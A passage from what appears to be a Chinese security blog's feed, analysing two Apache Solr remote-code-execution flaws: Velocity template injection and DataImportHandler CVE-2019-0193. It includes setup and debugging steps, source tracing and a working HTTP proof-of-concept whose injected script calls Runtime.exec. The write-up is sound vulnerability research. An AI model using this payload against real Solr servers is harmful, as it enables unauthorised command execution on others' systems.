class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">init:<span class="number">110</span>, VelocityResponseWriter (org.apache.solr.response)</span><br><span class="line">initInstance:<span class="number">104</span>, PluginBag (org.apache.solr.core)</span><br><span class="line">createInst:<span class="number">443</span>, PluginBag$LazyPluginHolder (org.apache.solr.core)</span><br><span class="line">get:<span class="number">415</span>, PluginBag$LazyPluginHolder (org.apache.solr.core)</span><br><span class="line">get:<span class="number">168</span>, PluginBag (org.apache.solr.core)</span><br><span class="line">get:<span class="number">178</span>, PluginBag (org.apache.solr.core)</span><br><span class="line">getQueryResponseWriter:<span class="number">2753</span>, SolrCore (org.apache.solr.core)</span><br><span class="line">getResponseWriter:<span class="number">788</span>, HttpSolrCall (org.apache.solr.servlet)</span><br><span class="line">call:<span class="number">556</span>, HttpSolrCall (org.apache.solr.servlet)</span><br><span class="line">doFilter:<span class="number">397</span>, SolrDispatchFilter (org.apache.solr.servlet)</span><br><span class="line">doFilter:<span class="number">343</span>, SolrDispatchFilter (org.apache.solr.servlet)</span><br></pre></td></tr></table></figure><p>在init()中可以看到enabled的值取决于<code>PARAMS_RESOURCE_LOADER_ENABLED</code>和<code>SOLR_RESOURCE_LOADER_ENABLED</code>，注意这里的获取方式：</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191208200421304.png" alt="image-20191208200421304"></p><p>对比下面的v8.3.1版本：</p><p><img src="/vulnresearch-Solr_Velocity_injection/image-20191208194710665.png" alt="image-20191208194710665"></p><p><code>Boolean.getBoolean()</code>是从系统变量里面拿参数，所以PoC的第一个包（0x01步）的设置没有用。即官方修复方案选择在PoC的第一步修复，即加载配置不从solr中加载而是从系统配置中加载，以此导致第二步中的模板不可控，PoC失效。</p><h1 id="检测方式"><a href="#检测方式" class="headerlink" title="检测方式"></a>检测方式</h1><p>因为涉及的变量和条件太多了，感觉白盒即使用污点传播也很难发现bug，另外，如果要用污点传播，最好能加上反向传播，这样才能识别官方的修复方案。</p><p>黑盒检测的话就看包发的那几个变量就可以了。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>又补上了一个史前的坑，这次solr的漏洞出发过程比较复杂，导致白盒很难检测，日后可以思考如何解决这一类漏洞。</p><h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><ul><li>漏洞分析 - Apache Solr 模版注入漏洞(RCE) ，<a href="https://xz.aliyun.com/t/6700" target="_blank" rel="noopener">https://xz.aliyun.com/t/6700</a> </li><li>详细分析Solr的CVE-2019-0193以及velocity模板注入新洞， <a href="https://mp.weixin.qq.com/s/gl35WFkxhAbuw7BNQa1FiQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/gl35WFkxhAbuw7BNQa1FiQ</a></li><li>Raw Poc，<a href="https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt" target="_blank" rel="noopener">https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt</a> </li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;p&gt;下载受影响版本的solr，这里依然选择v8.1.0，这里注意除了添加solr的jar还需要添加velocity的（源码的化可以让IDEA从maven上下源码）：&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/vulnresearch-Solr_Velocity_injection/image-20191124205421987.png&quot; alt=&quot;image-20191124205421987&quot;&gt;&lt;/p&gt;&lt;p&gt;同样的方法启动项目&lt;/p&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;anemone@ANEMONE-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-8.1.0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ &lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt; server/ &lt;span class=&quot;comment&quot;&gt;#一定要在server下运行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;anemone@ANEMONE-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-8.1.0/server&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ java &lt;span class=&quot;string&quot;&gt;&quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=9000&quot;&lt;/span&gt; -Dsolr.solr.home=&lt;span class=&quot;string&quot;&gt;&quot;../example/example-DIH/solr/&quot;&lt;/span&gt; -jar start.jar --module=http&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="http://anemone.top/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="http://anemone.top/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="Solr" scheme="http://anemone.top/tags/Solr/"/>
    
  </entry>
  
  <entry>
    <title>Solr DataImportHandler RCE(CVE-2019-0193)漏洞分析</title>
    <link href="http://anemone.top/vulnresearch-Solr_DataImportHandler_RCE/"/>
    <id>http://anemone.top/vulnresearch-Solr_DataImportHandler_RCE/</id>
    <published>2019-11-03T12:30:49.000Z</published>
    <updated>2019-11-23T02:36:05.576Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>先到solr上下载jar和src，这里选择的版本为v8.1.0</p><p><a href="https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0.zip" target="_blank" rel="noopener">https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0.zip</a></p><p><a href="https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0-src.tgz" target="_blank" rel="noopener">https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0-src.tgz</a></p><a id="more"></a><p>运行远程调试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">anemone<span class="meta">@ANEMONE</span>-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-<span class="number">8.1</span><span class="number">.0</span></span><br><span class="line">$ cd server/ #一定要在server下运行</span><br><span class="line">anemone<span class="meta">@ANEMONE</span>-ASUS:/mnt/d/Store/document/all_my_work/solr/solr-<span class="number">8.1</span><span class="number">.0</span>/server</span><br><span class="line">$ java <span class="string">"-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=9000"</span> -Dsolr.solr.home=<span class="string">"../example/example-DIH/solr/"</span> -jar start.jar --<span class="keyword">module</span>=http</span><br></pre></td></tr></table></figure><p>访问 <a href="http://localhost:8983/solr/" target="_blank" rel="noopener">http://localhost:8983/solr/</a> 出现控制台说明服务启动成功</p><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>发送payload(注意tika是demo中存在的core，需要针对其他站点做变动)</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/solr/tika/dataimport</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:8983</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">Content-Length</span>: 363</span><br><span class="line"></span><br><span class="line">command=full-import&amp;dataConfig=</span><br><span class="line">&lt;dataConfig&gt;</span><br><span class="line">  &lt;dataSource type="URLDataSource"/&gt;</span><br><span class="line">  &lt;script&gt;&lt;![CDATA[</span><br><span class="line">  function func(x)&#123;</span><br><span class="line">  java.lang.Runtime.getRuntime().exec("calc");</span><br><span class="line">  &#125; </span><br><span class="line">  ]]&gt;&lt;/script&gt;</span><br><span class="line">  &lt;document&gt;</span><br><span class="line">    &lt;entity name="stackoverflow" url="https://stackoverflow.com/feeds/tag/solr" processor="XPathEntityProcessor" forEach="/feed" transformer="script:func" /&gt;</span><br><span class="line">  &lt;/document&gt;</span><br><span class="line">&lt;/dataConfig&gt;</span><br></pre></td></tr></table></figure><p>能弹计算器说明payload生效。</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="dataimport"><a href="#dataimport" class="headerlink" title="dataimport"></a>dataimport</h3><p>先了解下<code>/solr/{core}/dataimport</code>，该API的作用是将数据全量/增量导入到solr中，更详细解释在：</p><ul><li><a href="https://cwiki.apache.org/confluence/display/solr/DataImportHandler#DataImportHandler-ScriptTransformer" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/solr/DataImportHandler#DataImportHandler-ScriptTransformer</a> </li><li><a href="https://lucene.apache.org/solr/guide/6_6/uploading-structured-data-store-data-with-the-data-import-handler.html" target="_blank" rel="noopener">https://lucene.apache.org/solr/guide/6_6/uploading-structured-data-store-data-with-the-data-import-handler.html</a> </li></ul><p>其中看到payload中需要的字段有：</p><ul><li>dataSource：数据源，有以下几种类型，每种类型有自己不同的属性<ul><li>JdbcDataSource：数据库源</li><li>URLDataSource：通常与XPathEntityProcessor配合使用，可以使用file://、http://、                          ftp://等协议获取文本数据源</li><li>HttpDataSource：与URLDataSource一样，只是名字不同</li><li>FileDataSource：从磁盘文件获取数据源</li><li>FieldReaderDataSource：如果字段包含xml信息时，可以使用这个配合XPathEntityProcessor                                使用</li><li>ContentStreamDataSource：使用post数据作为数据源，可与任何EntityProcessor配合使用</li></ul></li><li>Entity：实体，相当于将数据源的操作的数据封装成一个Java对象，字段就对应对象属性，对于xml/http数据源的实体可以在默认属性之上具有以下属性：<ul><li>url（必须）：用于调用REST API的URL。（可以模板化）。如果数据源是文件，则它必须是文件位置</li><li>processor（必须）：值必须是 “XPathEntityProcessor”</li><li>forEach（必须）：划分记录的xpath表达式。如果有多种类型的记录用“|”（管道）分隔它们。如果                         useSolrAddSchema设置为’true’，则可以省略</li><li>stream （可选）：如果xml非常大，则将此值设置为true</li></ul></li></ul><h3 id="ScriptTransformer"><a href="#ScriptTransformer" class="headerlink" title="ScriptTransformer"></a>ScriptTransformer</h3><p>从datasource变为entity存在转换(Transform)，而dataconfig中可以使用javascript写转化逻辑，例如官网中给的例子</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dataConfig</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span>&lt;![CDATA[</span><br><span class="line"><span class="javascript">                <span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params">row</span>)        </span>&#123;</span></span><br><span class="line"><span class="javascript">                    row.put(<span class="string">'message'</span>, <span class="string">'Hello World!'</span>);</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">return</span> row;</span></span><br><span class="line">                &#125;</span><br><span class="line">        ]]&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">document</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">entity</span> <span class="attr">name</span>=<span class="string">"e"</span> <span class="attr">pk</span>=<span class="string">"id"</span> <span class="attr">transformer</span>=<span class="string">"script:f1"</span> <span class="attr">query</span>=<span class="string">"select * from X"</span>&gt;</span></span><br><span class="line">                ....</span><br><span class="line">                <span class="tag">&lt;/<span class="name">entity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">document</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dataConfig</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这也是造成本次rce的sink点了。</p><h3 id="Nashorn-解析"><a href="#Nashorn-解析" class="headerlink" title="Nashorn 解析"></a>Nashorn 解析</h3><p>在<code>&lt;script&gt;</code>标签中，定义了js脚本，其背后是通过Nashorn做解析的，具体来说，其可以使用js语法，引用java中的对象，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> MyJavaClass = Java.type(<span class="string">`my.package.MyJavaClass`</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> result = MyJavaClass.sayHello(<span class="string">'Nashorn'</span>);</span><br><span class="line">print(result);</span><br></pre></td></tr></table></figure><h2 id="静态分析入口点"><a href="#静态分析入口点" class="headerlink" title="静态分析入口点"></a>静态分析入口点</h2><p>先拖下对应版本的源代码（<a href="https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0-src.tgz）" target="_blank" rel="noopener">https://archive.apache.org/dist/lucene/solr/8.1.0/solr-8.1.0-src.tgz）</a></p><p>找<code>/solr/{core}/dataimport</code>的入口，在<code>server/solr-webapp/webapp/WEB-INF/web.xml</code>看filter：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Any path (name) registered in solrconfig.xml will be sent to that filter --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>SolrRequestFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.solr.servlet.SolrDispatchFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">  Exclude patterns is a list of directories that would be short circuited by the </span></span><br><span class="line"><span class="comment">  SolrDispatchFilter. It includes all Admin UI related static content.</span></span><br><span class="line"><span class="comment">  <span class="doctag">NOTE:</span> It is NOT a pattern but only matches the start of the HTTP ServletPath.</span></span><br><span class="line"><span class="comment">  --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>excludePatterns<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/partials/.+,/libs/.+,/css/.+,/js/.+,/img/.+,/templates/.+<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>SolrRequestFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><p>所有的url通过<code>org.apache.solr.servlet.SolrDispatchFilter</code>处理，在这个类里面调试<code>doFilter()</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest _request, ServletResponse _response, FilterChain chain, <span class="keyword">boolean</span> retry)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!(_request <span class="keyword">instanceof</span> HttpServletRequest)) <span class="keyword">return</span>;</span><br><span class="line">  HttpServletRequest request = closeShield((HttpServletRequest)_request, retry);</span><br><span class="line">  HttpServletResponse response = closeShield((HttpServletResponse)_response, retry);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (cores == <span class="keyword">null</span> || cores.isShutDown()) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">    <span class="comment">// No need to even create the HttpSolrCall object if this path is excluded.</span></span><br><span class="line">    <span class="keyword">if</span> (excludePatterns != <span class="keyword">null</span>) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">    AtomicReference&lt;HttpServletRequest&gt; wrappedRequest = <span class="keyword">new</span> AtomicReference&lt;&gt;();</span><br><span class="line">    <span class="comment">// the response and status code have already been sent</span></span><br><span class="line">    <span class="keyword">if</span> (!authenticateRequest(request, response, wrappedRequest)) &#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">    <span class="keyword">if</span> (wrappedRequest.get() != <span class="keyword">null</span>) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line"> <span class="comment">// Authentication</span></span><br><span class="line">    <span class="keyword">if</span> (cores.getAuthenticationPlugin() != <span class="keyword">null</span>) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line"> <span class="comment">// Entry</span></span><br><span class="line">    HttpSolrCall call = getHttpSolrCall(request, response, retry);</span><br><span class="line">    ExecutorUtil.setServerThreadFlag(Boolean.TRUE);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      Action result = call.call();</span><br><span class="line">      <span class="keyword">switch</span> (result) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键代码在17-20行，首先根据request找到<code>HttpSolrCall</code>对象，再调用<code>HttpSolrCal#call()</code>方法获取返回值。</p><p>那么跟到<code>org.apache.solr.servlet.HttpSolrCall#call()</code>看下…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Action <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="comment">/*...*/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (cores == <span class="keyword">null</span>) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">  <span class="keyword">if</span> (solrDispatchFilter.abortErrorMessage != <span class="keyword">null</span>)&#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="comment">/*...*/</span></span><br><span class="line">    HttpServletResponse resp = response;</span><br><span class="line">    <span class="keyword">switch</span> (action) &#123;</span><br><span class="line">      <span class="keyword">case</span> ADMIN:</span><br><span class="line">        handleAdminRequest();</span><br><span class="line">        <span class="keyword">return</span> RETURN;</span><br><span class="line">      <span class="keyword">case</span> REMOTEQUERY:</span><br><span class="line">        SolrRequestInfo.setRequestInfo(<span class="keyword">new</span> SolrRequestInfo(req, <span class="keyword">new</span> SolrQueryResponse()));</span><br><span class="line">        remoteQuery(coreUrl + path, resp);</span><br><span class="line">        <span class="keyword">return</span> RETURN;</span><br><span class="line">      <span class="keyword">case</span> PROCESS:</span><br><span class="line">        <span class="keyword">final</span> Method reqMethod = Method.getMethod(req.getMethod());</span><br><span class="line">        HttpCacheHeaderUtil.setCacheControlHeader(config, resp, reqMethod);</span><br><span class="line">        <span class="comment">// unless we have been explicitly told not to, do cache validation</span></span><br><span class="line">        <span class="comment">// if we fail cache validation, execute the query</span></span><br><span class="line">        <span class="keyword">if</span> (config.getHttpCachingConfig().isNever304() ||</span><br><span class="line">            !HttpCacheHeaderUtil.doCacheHeaderValidation(solrReq, req, reqMethod, resp)) &#123;</span><br><span class="line">          SolrQueryResponse solrRsp = <span class="keyword">new</span> SolrQueryResponse();</span><br><span class="line">          SolrRequestInfo.setRequestInfo(<span class="keyword">new</span> SolrRequestInfo(solrReq, solrRsp));</span><br><span class="line">          execute(solrRsp);</span><br><span class="line">          <span class="comment">/*...*/</span></span><br><span class="line">          writeResponse(solrRsp, responseWriter, reqMethod);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> RETURN;</span><br><span class="line">      <span class="keyword">default</span>: <span class="keyword">return</span> action;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">    <span class="keyword">if</span> (shouldAudit(EventType.ERROR)) &#123;</span><br><span class="line">      cores.getAuditLoggerPlugin().doAudit(<span class="keyword">new</span> AuditEvent(EventType.ERROR, ex, req));</span><br><span class="line">    &#125;</span><br><span class="line">    sendError(ex);</span><br><span class="line">    <span class="comment">// walk the the entire cause chain to search for an Error</span></span><br><span class="line">    Throwable t = ex;</span><br><span class="line">    <span class="keyword">while</span> (t != <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (t <span class="keyword">instanceof</span> Error) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><h3 id="找入口点"><a href="#找入口点" class="headerlink" title="找入口点"></a>找入口点</h3><p>实在看不下去了，根本不知道走哪个case，还是动态调试吧，之前已经用jwdp起了项目，现在把solr源码下下来，用IDEA起一个项目，然后加<code>dist</code>和<code>server/lib</code>目录到library里，用RemoteDebug下断点调试就行了。</p><p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103160037181.png" alt="image-20191103160037181"></p><p>访问那个api后，调试发现走的是<code>PROCESS</code>的case：</p><p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103161357607.png" alt="image-20191103161357607"></p><p>继续向下看到图中542行：<code>org.apache.solr.servlet.HttpSolrCall#execute()</code>，跟进去：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(SolrQueryResponse rsp)</span> </span>&#123;</span><br><span class="line">  solrReq.getContext().put(<span class="string">"webapp"</span>, req.getContextPath());</span><br><span class="line">  solrReq.getCore().execute(handler, solrReq, rsp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取到SolrCore，执行其<code>org.apache.solr.core.SolrCore#execute()</code>方法，该方法会调用<code>handler.handleRequest(req,rsp)</code>对req做处理：</p><p><img src="/vulnresearch-Solr_DataImportHandler_RCE/image-20191103162039712.png" alt="image-20191103162039712"></p><p>在<code>handler.handleRequest(req,rsp)</code>中会调用<code>org.apache.solr.handler.RequestHandlerBase#handleRequestBody()</code>方法，如果是之前能静态分析到这里，可以像Chamd5的大佬一样，搜索该类的实现，发现<code>dataimport.DataImportHandler#handleRequestBody()</code>这个方法，但是现在既然已经动态调试了，那直接跟进去就行了。</p><p>至此，我们终于找到了处理该请求的入口。</p><h3 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleRequestBody</span><span class="params">(SolrQueryRequest req, SolrQueryResponse rsp)</span></span></span><br><span class="line"><span class="function">          <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    rsp.setHttpCaching(<span class="keyword">false</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> figure out why just the first one is OK...</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">    SolrParams params = req.getParams();</span><br><span class="line">    NamedList defaultParams = (NamedList) initArgs.get(<span class="string">"defaults"</span>);</span><br><span class="line">    RequestInfo requestParams = <span class="keyword">new</span> RequestInfo(req, getParamsMap(params), contentStream);</span><br><span class="line">    String command = requestParams.getCommand();    </span><br><span class="line">    <span class="keyword">if</span> (DataImporter.SHOW_CONF_CMD.equals(command)) &#123;<span class="comment">/*...*/</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (command != <span class="keyword">null</span> &amp;&amp; DataImporter.ABORT_CMD.equals(command)) &#123;</span><br><span class="line">      importer.runCmd(requestParams, <span class="keyword">null</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (importer.isBusy()) &#123;<span class="comment">/*...*/</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (command != <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="comment">// RCE</span></span><br><span class="line">      <span class="keyword">if</span> (DataImporter.FULL_IMPORT_CMD.equals(command)</span><br><span class="line">              || DataImporter.DELTA_IMPORT_CMD.equals(command) ||</span><br><span class="line">              IMPORT_CMD.equals(command)) &#123;</span><br><span class="line">        importer.maybeReloadConfiguration(requestParams, defaultParams);</span><br><span class="line">        <span class="comment">// 获取一个SolrWriter</span></span><br><span class="line">        DIHWriter sw = getSolrWriter(processor, loader, requestParams, req);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> 